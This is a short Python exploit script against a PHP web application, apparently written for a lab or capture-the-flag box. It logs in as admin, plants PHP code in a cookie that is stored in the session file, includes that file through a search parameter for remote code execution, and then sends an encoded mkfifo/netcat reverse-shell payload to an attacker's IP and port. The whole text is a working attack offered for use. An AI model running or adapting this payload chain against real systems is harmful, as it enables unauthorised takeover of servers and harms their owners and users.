import requests
import sys
import re

def main():
    if len(sys.argv) != 2:
        print("Usage: python exp.py <ip>")
        sys.exit(-1)
    ip = sys.argv[1]

    # step 1 : bypass login
    r = requests.Session()
    r.post("http://%s/authenticate.php" % ip, data={"username": "admin", "password": "8C6976E5B5410415BDE908BD4DEE15DFB167A9C873FC4BB8A81F6F2AB448A918"}, verify=False)
    sessionbase = r.cookies.get("PHPSESSID")
    # uncomment to get new session if session expired
    # print("(+) Session cookie obtained: %s" % sessionbase)

    url = "http://%s/home.php" % ip
    if(r.post(url, cookies={"PHPSESSID": sessionbase}, verify=False).status_code == 200):
        # paste value of sessionbase here to bypass login
        session = "quu3bn1vj4phsemgtrdja6k3e7"
        print("(+) Login bypass successful)), got session cookie: %s" % session)

        # step 2 : modify user_pref cookie to test rce
        r.headers.update({"Cookie": "PHPSESSID=%s; user_pref=%s" % (session, "%3c%3fphp%20system('id')%3b%3f%3e")})
        lfi_payload = "/var/lib/php/sessions/sess_%s" % session
        rce = r.post("http://%s/home.php" % ip, data={"search": lfi_payload}, headers={"Content-Type": "application/x-www-form-urlencoded"}, verify=False)
        if(re.search(r"uid=\d+", rce.text)):
            print("(+) Successful RCE, now perform revshell...")
            attacker_ip = "192.168.64.1" #change this to your attacker's IP
            attacker_port = "80" #change this to your attacker's port
            revshell = "%3c%3fphp%20system('rm%20%2ftmp%2ff%3bmkfifo%20%2ftmp%2ff%3bcat%20%2ftmp%2ff%7cbash%20-i%202%3e%261%7cnc%20" + attacker_ip + "%20" + attacker_port + "%20%3e%2ftmp%2ff')%3b%3f%3e"
            r.headers.update({"Cookie": "PHPSESSID=%s; user_pref=%s" % (session, revshell)})
            r.post("http://%s/home.php" % ip, data={"search": lfi_payload}, headers={"Content-Type": "application/x-www-form-urlencoded"}, verify=False)
            print("(+) Reverse shell payload sent, check your listener!")

if __name__ == "__main__":
    main()